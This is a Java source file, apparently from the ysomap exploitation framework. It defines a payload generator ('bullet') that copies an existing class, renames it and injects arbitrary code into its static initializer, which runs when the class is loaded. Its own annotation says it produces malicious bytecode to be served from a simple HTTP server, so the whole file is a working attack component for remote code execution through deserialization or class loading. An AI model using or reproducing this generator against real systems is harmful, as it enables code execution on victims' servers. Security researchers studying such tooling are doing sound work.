package ysomap.bullets.objects;

import javassist.ClassPool;
import javassist.CtClass;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.core.util.ClassFiles;

/**
 * @author wh1t3P1g
 * @since 2020/3/15
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("用于生成恶意字节码，配合SimpleHTTPServer使用")
@Targets({Targets.CODE})
@Dependencies({"*"})
public class ClassWithEvilStaticBlockFromExistClazz extends AbstractBullet<byte[]> {

    @Require(name = "classname", detail = "所需生成的类名")
    public String classname;

    @NotNull
    @Require(name = "existClazz", detail = "ysomap中存在的class类来生成对应的evil package")
    public String existClazz;

    @NotNull
    @Require(name = "code", detail = "需要插入到静态块的代码，需要保证代码的正确性")
    public String code;

    @NotNull
    @Require(name = "type", detail = "所需生成的文件类型，支持class或jar")
    public String type = null;

    @Override
    public byte[] getObject() throws Exception {
        try{
            Class<?> clazz = Class.forName(existClazz);
            ClassPool pool = new ClassPool(true);

            CtClass cc = ClassFiles.makeClassFromExistClass(pool, clazz, null);
            if(classname == null){
                classname = "pwn"+System.currentTimeMillis();
                Logger.normal("generte class: "+classname);
            }
            cc.setName(classname);
            if(code != null && !code.isEmpty()){
                ClassFiles.insertStaticBlock(cc, code);
            }
            return ClassFiles.getClassBytecode(cc);
        }catch (ClassNotFoundException e){
            Logger.error("class "+existClazz+" not found! plz check options.");
            throw e;
        }
    }

    public static Bullet newInstance(Object... args) throws Exception {
        ClassWithEvilStaticBlockFromExistClazz bullet = new ClassWithEvilStaticBlockFromExistClazz();
        bullet.set("type", args[0]);
        bullet.set("existClazz", args[1]);
        bullet.set("code", args[2]);
        bullet.set("classname", args[3]);
        return bullet;
    }
}
